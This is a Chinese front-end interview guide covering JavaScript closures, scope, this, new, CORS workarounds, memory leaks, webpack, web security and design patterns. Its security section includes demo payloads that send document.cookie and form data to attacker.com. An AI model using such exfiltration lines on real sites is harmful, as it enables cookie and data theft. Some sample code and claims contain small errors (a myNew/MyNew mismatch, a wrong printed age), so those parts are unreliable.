# JavaScript相关

## 1. 闭包是什么？

> [!IMPORTANT]
> 当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。

下面我们来看一段代码，清晰的展示了闭包：

```javascript
function foo() {
  var a = 2
  function bar() {
    console.log(a)
  }
  return bar
}

var baz = foo()

baz() // 2 —— 朋友，这就是闭包的效果。
```

函数 `bar()` 的词法作用域能够访问 `foo()` 的内部作用域。然后我们将 `bar()` 函数本身当作
一个值类型进行传递。

在这个例子中，我们将 `bar` 所引用的函数对象本身当作返回值。
在 `foo()` 执行后，其返回值（也就是内部的 `bar()` 函数）赋值给变量 `baz` 并调用 `baz()`，实
际上只是通过不同的标识符引用调用了内部的函数 `bar()`。

`bar()` 显然可以被正常执行。但是在这个例子中，它在自己定义的词法作用域以外的地方
执行。

在 `foo()` 执行后，通常会期待 `foo()` 的整个内部作用域都被销毁，因为我们知道引擎有垃
圾回收器用来释放不再使用的内存空间。由于看上去 `foo()` 的内容不会再被使用，所以很
自然地会考虑对其进行回收。

而闭包的“神奇”之处正是可以阻止这件事情的发生。事实上内部作用域依然存在，因此
没有被回收。谁在使用这个内部作用域？原来是 `bar()` 本身在使用。

拜 `bar()` 所声明的位置所赐，它拥有涵盖 `foo()` 内部作用域的闭包，使得该作用域能够一
直存活，以供 `bar()` 在之后任何时间进行引用。

`bar()` 依然持有对该作用域的引用，而这个引用就叫作**闭包**。

这个函数在定义时的词法作用域以外的地方被调用。**闭包使得函数可以继续访问定义时的词法作用域**。

当然，无论使用何种方式对函数类型的值进行传递，当函数在别处被调用时都可以观察到闭包。

```javascript
function foo() {
  var a = 2
  function baz() {
    console.log(a)
  }
  bar(baz)
}

function bar(fn) {
  fn() // 2 —— 依然能访问到a，这就是闭包的效果
}
```

把内部函数 `baz` 传递给 `bar`，当调用这个内部函数时（现在叫作 `fn`），它涵盖的 `foo()` 内部作用域的闭包就可以观察到了，因为它能够访问 `a`。

传递函数当然也可以是间接的。

```javascript
var fn

function foo() {
  var a = 2
  function baz() {
    console.log(a)
  }
  fn = baz
}

function bar() {
  fn() // 2 —— 闭包的效果
}

foo()

bar() // 2
```

本质上**无论何时何地**，如果将函数（访问它们各自的词法作用域）当作第一级的值类型并到处递，你就会看到闭包在这些函数中的应用。**在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包！**

> [!IMPORTANT]
> 闭包是 JavaScript 中最强大的抽象之一。它使得函数可以持有状态，即使在函数外部调用。  
> 无论通过何种手段将内部函数传递到所在的词法作用域以外，它都会持有对原始定义作用域的引用，无论在何处执行这个函数都会使用闭包。  
> 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露，需要多多注意。

**举出闭包常用场景的例子：**

1. 防抖节流函数：

```javascript
// 防抖
function debounce(fn, delay = 300) {
  let timer //闭包引用的外界变量
  return function () {
    const args = arguments
    if (timer) {
      clearTimeout(timer)
    }
    timer = setTimeout(() => {
      fn.apply(this, args)
    }, delay)
  }
}
```

2. 使用闭包可以在 JavaScript 中模拟块级作用域：

```javascript
function outputNumbers(count) {
  ;(function () {
    for (var i = 0; i < count; i++) {
      alert(i)
    }
  })()
  alert(i) //导致一个错误！
}
```

3. 闭包可以用于在对象中创建私有变量，也就是模块化

```javascript
function User(name) {
  var _name = name // 私有变量
  return {
    getName: function () {
      return _name
    },
    setName: function (name) {
      _name = name
    },
  }
}
User('Van').getName() // Van
```

## 2. 说说你对作用域链的理解

- 作用域链是一种用于查找变量和函数的机制，它是由当前执行环境和其所有父级执行环境的变量对象组成的链式结构。当在一个执行环境中访问变量或函数时，会首先在当前执行环境的变量对象中查找，如果找不到，则会沿着作用域链向上查找，直到找到对应的变量或函数，或者达到最外层的全局对象（如`window`）。
- 作用域链的创建是在函数定义时确定的，它与函数所处的词法作用域有关。当函数被调用时，会创建一个新的执行环境，其中包含一个新的变量对象，并将其添加到作用域链的前端。这样，函数内部就可以访问其所在作用域以及其外部作用域中的变量和函数，形成了一个作用域链。

以下是一段示例代码，展示了作用域链的查找过程：

```javascript
function outer() {
  var outerVar = 'Outer variable'

  function inner() {
    var innerVar = 'Inner variable'
    console.log(innerVar) // 内部作用域的变量
    console.log(outerVar) // 外部作用域的变量
    console.log(globalVar) // 全局作用域的变量
  }
  inner()
}
var globalVar = 'Global variable'
outer()
```

在上述示例中，函数`inner()`内部可以访问到其外部函数`outer()`中定义的变量`outerVar`，这是因为`inner()`的作用域链中包含了外部函数的变量对象。同样，`inner()`也可以访问全局作用域中的变量`globalVar`，因为全局作用域也在作用域链中。

通过作用域链的机制，函数可以访问外部作用域中的变量，但外部作用域不能访问函数内部的变量，这就实现了变量的封装和保护。

值得注意的是，当函数执行完毕后，其执行环境会被销毁，对应的变量对象也会被释放，因此作用域链也随之消失。这也是闭包的概念中所提到的保持变量的生命周期的特性。

**总结：**

- 作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上（或者向外部）访问，变量访问到`window`对象即被终止，作用域链向下（或者向内部）访问变量是不被允许的
- 简单的说，**作用域就是变量与函数的可访问范围**，即作用域控制着变量与函数的可见性和生命周期

## 3. JavaScript原型，原型链是什么 ？

看完这张图，你就会明白原型和原型链的关系了：

![原型链](/images/prototype.jpg)

## 4. 谈谈This对象的理解

- **在全局作用域中**，`this` 指向全局对象（在浏览器环境中通常是 `window` 对象）。
- **在函数中**，`this` 的值取决于函数的调用方式。
  - 如果函数是作为对象的方法调用，`this` 指向调用该方法的对象。
  - 如果函数是作为普通函数调用，`this` 指向全局对象（非严格模式下）或 `undefined`（严格模式下）。
  - 如果函数是通过 `call`、`apply` 或 `bind` 方法调用，`this` 指向 `call`、`apply` 或 `bind` 方法的第一个参数所指定的对象。
  - 如果函数是作为构造函数调用（使用 `new` 关键字），`this` 指向新创建的对象。
- **在箭头函数中**，`this` 的值是继承自外部作用域的，它不会因为调用方式的改变而改
  变。

下面是一些示例代码，以说明 `this` 的不同情况：

```javascript
// 全局作用域中的 this
console.log(this) // 输出: Window

// 对象方法中的 this
const obj = {
  name: 'poetry',
  sayHello: function () {
    console.log(`Hello, ${this.name}!`)
  },
}
obj.sayHello() // 输出: Hello, poetry!

// 普通函数调用中的 this
function greeting() {
  console.log(`Hello, ${this.name}!`)
}
greeting() // 输出: Hello, undefined (非严格模式下输出: Hello, [全局对象的某个属性值])

// 使用 call/apply/bind 改变 this
const person = {
  name: 'poetry',
}
greeting.call(person) // 输出: Hello, poetry!
greeting.apply(person) // 输出: Hello, poetry!
const boundGreeting = greeting.bind(person)
boundGreeting() // 输出: Hello, poetry!

// 构造函数中的 this
function Person(name) {
  this.name = name
}
const poetry = new Person('poetry')
console.log(poetry.name) // 输出: poetry

// 箭头函数中的 this
const arrowFunc = () => {
  console.log(this)
}
arrowFunc() // 输出: Window
```

## 5. new操作符具体干了什么呢?

当使用 new 关键字调用函数时，该函数将被用作构造函数。new 将执行以下操作：

1. 创建一个空的简单 JavaScript 对象。为方便起见，我们称之为 `newInstance。`
2. 如果构造函数的 `prototype` 属性是一个对象，则将 `newInstance` 的 `[[Prototype]]` 指向构造函数的 `prototype` 属性，否则 `newInstance` 将保持为一个普通对象，其 `[[Prototype]]` 为 `Object.prototype`。

   > [!NOTE]
   > 备注：因此，通过构造函数创建的所有实例都可以访问添加到构造函数 prototype 属性中的属性/对象。

3. 使用给定参数执行构造函数，并将 `newInstance` 绑定为 `this` 的上下文（换句话说，在构造函数中的所有 `this` 引用都指向 `newInstance）。`
4. 如果构造函数返回非原始值，则该返回值成为整个 `new` 表达式的结果。否则，如果构造函数未返回任何值或返回了一个原始值，则返回 `newInstance`。（通常构造函数不返回值，但可以选择返回值，以覆盖正常的对象创建过程。）

**实现一个简单的 new 方法，可以按照以下步骤进行操作：**

1. 创建一个新的空对象。
2. 将新对象的原型链接到构造函数的原型对象。
3. 将构造函数的作用域赋给新对象，以便在构造函数中使用 `this` 引用新对象。
4. 执行构造函数，并将参数传递给构造函数。
5. 如果构造函数没有显式返回一个对象，则返回新对象。

```javascript
function MyNew(constructor, ...args) {
  // 创建一个新的空对象
  const newObj = {}

  // 将新对象的原型链接到构造函数的原型对象
  Object.setPrototypeOf(newObj, constructor.prototype)

  // 将构造函数的作用域赋给新对象，并执行构造函数
  const result = constructor.apply(newObj, args)

  // 如果构造函数有显式返回一个对象，则返回该对象；否则返回新对象
  return typeof result === 'object' && result !== null ? result : newObj
}
```

使用上述自定义的 `MyNew` 方法，可以实现与 `new` 操作符类似的效果，如下所示：

```javascript
function Person(name, age) {
  this.name = name
  this.age = age
}

Person.prototype.sayHello = function () {
  console.log('Hello, my name is ' + this.name)
}

var van = myNew(Person, 'van', 25)
console.log(van.name) // 输出: van
console.log(van.age) // 输出: 26
van.sayHello() // 输出: Hello, my name is van
```

注意，这只是一个简化的实现，不考虑一些复杂的情况，例如原型链的继承和构造函数返回对象的情况。在实际应用中，建议使用内置的 `new` 操作符来创建对象实例，因为它处理了更多的细节和边界情况。

## 6. 如何解决跨域问题?

> [!NOTE]
> 首先了解下浏览器的同源策略 同源策略`/SOP（Same origin policy）`是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到`XSS`、`CSRF`等攻击。所谓同源是指"**协议+域名+端口**"三者相同，即便两个不同的域名指向同一个ip地址，也非同源

**1. 通过jsonp跨域：**

```javascript
function jsonp(url, params, callback) {
  // 生成唯一的回调函数名
  const callbackName = 'jsonp_' + Date.now()

  // 将参数拼接到 URL 中
  const queryString = Object.keys(params)
    .map(
      (key) => encodeURIComponent(key) + '=' + encodeURIComponent(params[key]),
    )
    .join('&')

  // 创建 script 元素
  const script = document.createElement('script')
  script.src = url + '?' + queryString + '&callback=' + callbackName

  // 定义回调函数
  window[callbackName] = function (data) {
    // 调用回调函数
    callback(data)

    // 删除 script 元素和回调函数
    document.head.removeChild(script)
    delete window[callbackName]
  }

  // 将 script 元素添加到页面中
  document.head.appendChild(script)
}
```

使用示例:

```javascript
jsonp('http://www.example.com/api', { user: 'admin' }, function (data) {
  console.log(data)
})
```

这个 `jsonp` 函数接受三个参数：URL、参数对象和回调函数。它会生成一个唯一的回调函数名，并将参数拼接到 URL 中。然后创建一个 `<script>` 元素，并将 URL 设置为带有回调函数名的 URL。定义一个全局的回调函数，当响应返回时调用该回调函数，并将数据传递给回调函数。最后将 `<script>` 元素添加到页面中，触发跨域请求。当请求完成后，删除 `<script>` 元素和回调函数。

这样，你就可以通过封装的 JSONP 方法来实现跨域请求并获取响应数据了。

**2. 代理服务器跨域：**

我们拿Nginx举例，通过 Nginx 配置反向代理，修改响应头中的`Access-Control-Allow-Origin`等字段，从而避免浏览器的同源策略限制。

下面是一个示例配置，展示了如何通过 Nginx 实现跨域代理：

```nginx
server {
  listen 80;
  server_name your-domain.com;

  location /api {
    # 设置代理目标地址
    proxy_pass http://api.example.com;
    # 设置允许的跨域请求头
    add_header Access-Control-Allow-Origin $http_origin;
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS";
    add_header Access-Control-Allow-Credentials true;
    add_header Access-Control-Allow-Headers "Origin, X-Requested-With, Content-Type, Accept";
    # 处理预检请求（OPTIONS 请求）
    if ($request_method = OPTIONS) {
      return 200;
    }
  }
}
```

**3. 后端在头部信息里面设置安全域名：**

后端可以在响应的头部信息中设置 `Access-Control-Allow-Origin` 字段，指定允许跨域访问的域名。例如，在 Node.js 中可以使用 `cors` 模块来实现：

```javascript
const express = require('express')
const cors = require('cors')

const app = express()

// 允许所有域名跨域访问
app.use(cors())

// 其他路由和逻辑处理...

app.listen(3000, () => {
  console.log('Server is running on port 3000')
})
```

**4. 通过webpack DevServer代理(开发阶段)：**

使用 `webpack-dev-server` 的代理功能可以实现在开发过程中的跨域请求。你可以配置 `devServer` 对象中的 `proxy` 选项来设置代理。下面是一个示例配置：

```javascript
module.exports = {
  // 其他配置项...
  devServer: {
    proxy: {
      '/api': {
        target: 'http://api.example.com', // 设置代理目标地址
        pathRewrite: { '^/api': '' }, // 重写请求路径，去掉 '/api' 前缀
        changeOrigin: true, // 修改请求头中的 Origin 为目标地址
      },
    },
  },
}
```

## 7. 当点击`a`标签时，浏览器怎么判断这次请求是需要显示还是下载?

当浏览器通过 `<a>` 标签下载一个文件时，浏览器如何判断这个文件是需要打开（在浏览器中显示）还是需要下载，主要取决于以下几个因素：

1. **HTTP 响应头**

浏览器通过查看 HTTP 响应头中的 `Content-Disposition` 和 `Content-Type` 头来决定如何处理文件。

- `Content-Disposition` 头

  - **`inline`**: 如果 `Content-Disposition` 被设置为 `inline`，浏览器会尝试直接在窗口中显示文件（例如，显示 PDF 文件）。
  - **`attachment`**: 如果 `Content-Disposition` 被设置为 `attachment`，并且包含 `filename` 属性，那么浏览器通常会下载该文件，而不是直接打开。例如：

    ```http
    Content-Disposition: attachment; filename="example.pdf"
    ```

    这将强制浏览器下载文件 `example.pdf`，而不是在浏览器中打开。

- `Content-Type` 头

  - **MIME 类型**: `Content-Type` 头指定了文件的 MIME 类型，浏览器根据此 MIME 类型决定如何处理文件。例如：

    ```http
    Content-Type: application/pdf
    ```

    这告诉浏览器文件是 PDF 类型，浏览器可能会尝试在内置的 PDF 阅读器中打开文件。

    如果 MIME 类型是浏览器无法处理的类型（例如 `application/octet-stream`），浏览器通常会直接下载文件。

2. **`<a>` 标签的 `download` 属性**

HTML5 引入了 `<a>` 标签的 `download` 属性，允许开发者显式指示浏览器下载文件，而不是打开它。

```html
<a href="example.pdf" download>Download PDF</a>
```

- **`download` 属性**: 当 `<a>` 标签带有 `download` 属性时，浏览器会忽略 `Content-Type` 和 `Content-Disposition` 头，直接下载文件。属性值可以指定下载文件的默认名称。

3. **浏览器默认行为与用户设置**

   - **内置文件处理**: 浏览器对某些文件类型有内置处理能力（如 PDF、图像、视频等）。对于这些文件，浏览器通常会尝试在窗口中打开它们，而不是下载。
   - **用户设置**: 用户可以在浏览器设置中自定义行为，例如，总是下载特定类型的文件，而不是打开它们。

4. **URL 指向内容**

   - **文件扩展名**: 虽然不直接决定浏览器行为，但 URL 中的文件扩展名（如 `.pdf`, `.jpg`, `.html`）可以给浏览器一个提示，表明文件的类型。

**示例分析：**

假设有以下几个场景：

场景 1：直接在浏览器中打开

```http
Content-Type: application/pdf
Content-Disposition: inline
```

这个响应头告诉浏览器文件是 PDF 类型，并且希望在浏览器中直接打开它。浏览器会尝试使用内置的 PDF 阅读器显示文件。

场景 2：强制下载文件

```http
Content-Type: application/pdf
Content-Disposition: attachment; filename="example.pdf"
```

这个响应头告诉浏览器文件是 PDF 类型，但要将其作为附件下载。浏览器会弹出下载对话框或自动保存文件。

场景 3：使用 `download` 属性

```html
<a href="example.pdf" download="myfile.pdf">Download PDF</a>
```

即使服务器没有设置 `Content-Disposition` 头，但由于使用了 `download` 属性，浏览器将直接下载文件，并将其命名为 `myfile.pdf`。

**结论：**

浏览器通过结合 `Content-Disposition` 和 `Content-Type` 响应头、`<a>` 标签的 `download` 属性，以及浏览器的内置功能和用户设置，来决定文件是应该下载还是直接在浏览器中打开。如果想控制文件的下载行为，开发者可以利用这些机制实现。

## 8.模块化开发怎么做？

当涉及模块化开发时，有多种方法可供选择：

**1. 立即执行函数(IIFE)模式：**

- 使用立即执行函数来创建模块，将私有成员放在函数作用域内，不直接暴露给外部。
- 通过返回一个包含公共方法的对象，使这些方法可以在外部访问。

```javascript
var module = (function () {
  var privateVar = 'Private Variable'

  function privateMethod() {
    console.log('This is a private method')
  }

  function publicMethod() {
    console.log('This is a public method')
  }

  return {
    publicMethod: publicMethod,
  }
})()

module.publicMethod() // Output: This is a public method
```

**2. CommonJS 规范：**

- 使用 `require` 导入模块，使用 `module.exports` 或 `exports` 导出模块。
- 适用于 Node.js 环境。

```javascript
// math.js
function add(a, b) {
  return a + b
}

function subtract(a, b) {
  return a - b
}

module.exports = {
  add,
  subtract,
}
```

```javascript
// app.js
const math = require('./math')

console.log(math.add(2, 3)) // Output: 5
console.log(math.subtract(5, 2)) // Output: 3
```

**3. ES Module 规范(ES6)：**

- 使用 `import` 导入模块，使用 `export` 导出模块。
- 适用于现代浏览器环境和支持 ES6 模块的工具链。

```javascript
// math.js
export function add(a, b) {
  return a + b
}

export function subtract(a, b) {
  return a - b
}
```

```javascript
// app.js
import { add, subtract } from './math'

console.log(add(2, 3)) // Output: 5
console.log(subtract(5, 2)) // Output: 3
```

**4. AMD 规范：**

- 使用 `define` 定义模块，通过异步加载模块。
- 适用于浏览器环境和需要按需加载模块的场景。

```javascript
// math.js
define([], function () {
  function add(a, b) {
    return a + b
  }

  function subtract(a, b) {
    return a - b
  }

  return {
    add,
    subtract,
  }
})
```

```javascript
// app.js
require(['math'], function (math) {
  console.log(math.add(2, 3)) // Output: 5
  console.log(math.subtract(5, 2)) // Output: 3
})
```

以上是常见的模块化开发方式，每种方式都有自己的特点和使用场景，可以根据具体需求选择适合的模块化规范。

## 9. 哪些操作会造成内存泄漏？

> JavaScript 内存泄露指对象在不需要使用它时仍然存在，导致占用的内存不能使用或回收。内存泄漏可能会导致应用程序性能下降，甚至导致浏览器崩溃。

- 未使用 `var` 声明的全局变量
- 闭包函数(`Closures`)
- 循环引用(两个对象相互引用)
- 控制台日志(`console.log`)
- 移除存在绑定事件的`DOM`元素(`IE`)
- `setTimeout` 的第一个参数使用字符串而非函数的话，会引发内存泄漏
- 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 `0`（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收

## 10. 谈谈你对webpack的看法

Webpack是一个功能强大的模块打包工具，它在现代Web开发中扮演着重要的角色。以下是对Webpack的看法：

1. **模块化开发**：Webpack以模块化的方式管理项目中的各种资源，包括JavaScript、CSS、图片、字体等。它能够将这些资源视为模块，并根据模块之间的依赖关系进行打包，使代码结构更清晰、可维护性更高。
2. **强大的打包能力**：Webpack具有强大的打包能力，能够将项目中的多个模块打包成一个或多个静态资源文件。它支持各种模块加载器和插件，可以处理各种类型的资源文件，并且能够进行代码压缩、文件合并、按需加载等优化操作，以提高应用的性能和加载速度。
3. **生态系统丰富**：Webpack拥有一个庞大的插件生态系统，可以满足各种项目的需求。通过使用各种插件，我们可以实现代码的优化、资源的压缩、自动化部署等功能，大大提升了开发效率。
4. **开发工具支持**：Webpack提供了开发工具和开发服务器，支持热模块替换（Hot Module Replacement）等功能，使开发过程更加高效和便捷。它能够实时监听文件的变化并自动重新编译和刷新页面，极大地提升了开发体验。
5. **社区活跃**：Webpack拥有一个庞大的社区，开发者们积极分享各种有用的插件和工具，提供了大量的学习资源和解决方案。通过与社区的交流和学习，我们可以更好地了解Webpack的使用技巧和最佳实践。

> 总的来说，Webpack是一个非常强大和灵活的模块打包工具，它在现代Web开发中发挥着重要作用。通过Webpack，我们可以更好地组织和管理项目代码，提高开发效率和代码质量，同时也能够享受到丰富的插件和工具支持。

## 11. 常见web安全及防护原理

常见Web安全问题及对应的防护原理如下所示，并附上相应的示例代码：

**1. SQL注入:**

就是通过把`SQL`命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的`SQL`命令

- 总的来说有以下几点

  - 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双`"-"`进行转换等
  - 永远不要使用动态拼装SQL，可以使用参数化的`SQL`或者直接使用存储过程进行数据查询存取
  - 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接
  - 不要把机密信息明文存放，请加密或者`hash`掉密码和敏感的信息

- 防护原理：

  - 使用参数化查询或预编译语句
  - 使用ORM框架或查询构建器
  - 对用户输入进行输入验证和过滤

```javascript
// 使用参数化查询
const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(sql, [username, password], (err, result) => {
  // 处理查询结果
});

// 使用预编译语句
const sql = 'SELECT * FROM users WHERE username = ? AND password = ?';
const stmt = db.prepare(sql);
stmt.run(username, password, (err, result) => {
  // 处理查询结果
});

```

**2. 跨站脚本攻击 (XSS)：**

> [!IMPORTANT] > `Xss(cross-site scripting)`攻击指的是攻击者往`Web`页面里插入恶意`html`标签或者`javascript`代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取`cookie`中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点

- 防护原理：
  - 对用户输入进行合适的转义和过滤
  - 使用安全的模板引擎或自动转义函数
  - 使用HTTP头部中的Content Security Policy (CSP)

```javascript
// 对用户输入进行转义
function escapeHTML(input) {
  return input.replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
// 使用安全的模板引擎
const template = Handlebars.compile('{{data}}')
const html = template({ data: userInput })

// 使用Content Security Policy (CSP)
res.setHeader('Content-Security-Policy', "script-src 'self'")
```

**3. 跨站请求伪造 (CSRF)：**

- 防护原理：
  - 使用`CSRF Token`进行验证
  - 验证请求来源
  - 验证`HTTP Referer`头

```javascript
// 使用CSRF Token进行验证
app.use((req, res, next) => {
  res.locals.csrfToken = generateCSRFToken()
  next()
})

// 验证请求来源
if (req.headers.origin !== 'https://example.com') {
  // 请求不是来自预期的来源，拒绝处理
}

// 验证HTTP Referer头
if (req.headers.referer !== 'https://example.com/') {
  // 请求不是来自预期的来源，拒绝处理
}
```

**XSS与CSRF有什么区别吗？**

XSS（跨站脚本攻击）和 CSRF（跨站请求伪造）是两种不同类型的安全威胁，其区别如下：

**XSS（跨站脚本攻击）:**

- 目标：获取用户的敏感信息、执行恶意代码。
- 攻击方式：攻击者向受信任网站注入恶意脚本代码，使用户的浏览器执行该恶意脚本。
- 攻击原理：XSS攻击利用了网页应用对用户输入的信任，通过注入恶意脚本代码，使其在用户的浏览器中执行。
- 防护措施：对用户输入进行合适的转义和过滤，使用安全的模板引擎或自动转义函数，使用Content Security Policy（CSP）等。

**CSRF（跨站请求伪造）:**

- 目标：以用户的身份执行非预期的操作。
- 攻击方式：攻击者诱使用户在受信任网站上执行恶意操作，利用用户的身份发起恶意请求。
- 攻击原理：CSRF攻击利用了用户在受信任网站上的身份验证信息，通过伪造请求，使用户在不知情的情况下执行恶意操作。
- 防护措施：使用CSRF Token进行验证，验证请求来源、HTTP Referer头，双重提交Cookie验证等。

**总结：**

- XSS攻击注重利用网页应用对用户输入的信任，目标是获取用户的敏感信息和执行恶意代码。
- CSRF攻击注重利用网页应用对用户已认证身份的信任，目标是代替用户完成指定的动作。

**XSS攻击获取Cookie的示例：**

```html
<!-- index.html -->
<!doctype html>
<html>
  <head>
    <title>XSS Attack Demo</title>
  </head>
  <body>
    <h1>XSS Attack Demo</h1>
    <div id="content"></div>
    <script src="payload.js"></script>
  </body>
</html>
```

```javascript
// payload.js
const maliciousScript = `
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
  xhr.send();
`

document.getElementById('content').innerHTML = maliciousScript
```

在上述示例中，恶意脚本`payload.js`被注入到页面中。该脚本通过`XMLHttpRequest`发送`GET`请求，将页面中的`Cookie`信息发送给攻击者控制的服务器。

**CSRF攻击的示例：**

```html
<!-- index.html -->
<!doctype html>
<html>
  <head>
    <title>CSRF Attack Demo</title>
  </head>
  <body>
    <h1>CSRF Attack Demo</h1>
    <form id="csrfForm" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="submit" value="Transfer Money" />
    </form>
    <script src="payload.js"></script>
  </body>
</html>
```

```javascript
// payload.js
const maliciousScript = `
  const form = document.getElementById('csrfForm');
  form.action = 'http://attacker.com/steal-data';
  form.submit();
`
// document.getElementById('content').innerHTML = maliciousScript
eval(maliciousScript)
```

在上述示例中，恶意脚本`payload.js`被执行。该脚本修改了表单`csrfForm`的目标地址为攻击者控制的服务器，并提交表单。当用户点击"Transfer"按钮时，实际上会向攻击者服务器发送用户的敏感数据。

请注意，以上示例仅为了说明XSS攻击和CSRF攻击的原理，并非真实的攻击代码。在实际开发中，应该采取相应的防护措施来预防这些安全威胁，如输入验证、输出编码、使用CSRF令牌等。

## 12. 用过哪些设计模式？

当被问到你用过哪些设计模式时，你可以列举出你在前端开发中常使用的设计模式。以下是几个常见的设计模式，以及它们的优缺点、适用场景和示例代码：

**1. 工厂模式（Factory Pattern）：**

- 优点：封装了对象的创建过程，降低了耦合性，提供了灵活性和可扩展性。
- 缺点：增加了代码的复杂性，需要创建工厂类。
- 适用场景：当需要根据不同条件创建不同对象时，或者需要隐藏对象创建的细节时，可以使用工厂模式。

```javascript
class Button {
  constructor(text) {
    this.text = text
  }
  render() {
    console.log(`Rendering button with text: ${this.text}`)
  }
}

class ButtonFactory {
  createButton(text) {
    return new Button(text)
  }
}

const factory = new ButtonFactory()
const button = factory.createButton('Submit')
button.render() // Output: Rendering button with text: Submit
```

**2. 单例模式（Singleton Pattern）：**

- 优点：确保一个类只有一个实例，节省系统资源，提供全局访问点。
- 缺点：可能引入全局状态，不利于扩展和测试。
- 适用场景：当需要全局唯一的对象实例时，例如日志记录器、全局配置对象等，可以使用单例模式。

示例代码：

```javascript
class Logger {
  constructor() {
    if (Logger.instance) {
      return Logger.instance
    }
    Logger.instance = this
  }
  log(message) {
    console.log(`Logging: ${message}`)
  }
}

const logger1 = new Logger()
const logger2 = new Logger()

console.log(logger1 === logger2) // Output: true
```

**3. 观察者模式（Observer Pattern）：**

- 优点：定义了一种一对多的依赖关系，当一个对象的状态发生变化时，所有依赖它的对象都会得到通知。
- 缺点：可能导致循环引用，增加了对象之间的耦合性。
- 适用场景：当一个对象的改变需要通知其他对象，并且不知道具体有多少对象需要通知时，可以使用观察者模式。

示例代码：

```javascript
class Subject {
  constructor() {
    this.observers = []
  }
  addObserver(observer) {
    this.observers.push(observer)
  }
  removeObserver(observer) {
    const index = this.observers.indexOf(observer)
    if (index !== -1) {
      this.observers.splice(index, 1)
    }
  }
  notify(message) {
    this.observers.forEach((observer) => observer.update(message))
  }
}

class Observer {
  update(message) {
    console.log(`Received message: ${message}`)
  }
}

const subject = new Subject()
const observer1 = new Observer()
const observer2 = new Observer()

subject.addObserver(observer1)
subject.addObserver(observer2)
subject.notify('Hello, observers!') // Output
```

此处需要注意，`Vue.js` 中的响应式数据和`watch`功能就是基于观察者模式实现的。当数据发生变化时，会通知所有依赖该数据的组件进行更新。

**4. 发布订阅模式（Publish-Subscribe Pattern）：**

- 优点：解耦了发布者和订阅者，使它们可以独立变化。增加了代码的灵活性和可维护性。
- 缺点：可能会导致发布者过度发布消息，造成性能问题。订阅者需要订阅和取消订阅相关的逻辑。
- 适用场景：当一个对象的改变需要通知多个对象，并且对象之间的关系是**多对多**时，可以使用发布订阅模式。

示例代码：

```javascript
class PubSub {
  constructor() {
    this.subscribers = {}
  }
  subscribe(event, callback) {
    if (!this.subscribers[event]) {
      this.subscribers[event] = []
    }
    this.subscribers[event].push(callback)
  }
  unsubscribe(event, callback) {
    const subscribers = this.subscribers[event]
    if (subscribers) {
      this.subscribers[event] = subscribers.filter((cb) => cb !== callback)
    }
  }
  publish(event, data) {
    const subscribers = this.subscribers[event]
    if (subscribers) {
      subscribers.forEach((callback) => callback(data))
    }
  }
}

// 创建发布订阅对象
const pubsub = new PubSub()

// 订阅事件
const callback1 = (data) => console.log('Subscriber 1:', data)
const callback2 = (data) => console.log('Subscriber 2:', data)
pubsub.subscribe('event1', callback1)
pubsub.subscribe('event1', callback2)

// 发布事件
pubsub.publish('event1', 'Hello, world!')

// 取消订阅事件
pubsub.unsubscribe('event1', callback2)

// 再次发布事件
pubsub.publish('event1', 'Hello again!')
```

此处需要注意，`Vue.js` 中的事件总线（Event Bus）和`$emit`、`$on`方法就是基于发布订阅模式实现的。通过事件总线，可以实现组件之间的通信和解耦。

**5. 策略模式（Strategy Pattern）：**

- 优点：定义了一系列算法，使得算法可以相互替换，提高了代码的灵活性和可维护性。
- 缺点：增加了对象的数量，可能导致类爆炸。
- 适用场景：当需要在运行时根据不同情况选择不同的算法时，可以使用策略模式。

示例代码：

```javascript
class PaymentStrategy {
  pay(amount) {
    throw new Error('This method must be overridden')
  }
}

class CreditCardPayment extends PaymentStrategy {
  pay(amount) {
    console.log(`Paying ${amount} using credit card`)
  }
}

class PayPalPayment extends PaymentStrategy {
  pay(amount) {
    console.log(`Paying ${amount} using PayPal`)
  }
}

class PaymentContext {
  constructor(strategy) {
    this.strategy = strategy
  }
  pay(amount) {
    this.strategy.pay(amount)
  }
}

const creditCardPayment = new CreditCardPayment()
const payPalPayment = new PayPalPayment()

const paymentContext1 = new PaymentContext(creditCardPayment)
paymentContext1.pay(100) // Output: Paying 100 using credit card

const paymentContext2 = new PaymentContext(payPalPayment)
paymentContext2.pay(50) // Output: Paying 50 using PayPal
```

发布订阅模式（Publish-Subscribe Pattern）和观察者模式（Observer Pattern）是两种常见的设计模式，它们有一些相似之处，但也存在一些区别。

相似之处：

- 都用于实现对象之间的消息通信和事件处理。
- 都支持解耦，让发布者和订阅者（观察者）之间相互独立。

区别：

- 关注点不同：观察者模式关注的是一个主题对象（被观察者）和多个观察者对象之间的关系。当主题对象的状态发生变化时，它会通知所有观察者对象进行更新。而发布订阅模式关注的是发布者和订阅者之间的关系，发布者将消息发送到一个中心调度器（或者称为事件总线），然后由调度器将消息分发给所有订阅者。
- 中间件存在与否：发布订阅模式通常需要一个中间件（调度器或事件总线）来管理消息的发布和订阅，这样发布者和订阅者之间的通信通过中间件进行。而观察者模式则直接在主题对象和观察者对象之间进行通信，没有中间件的参与。
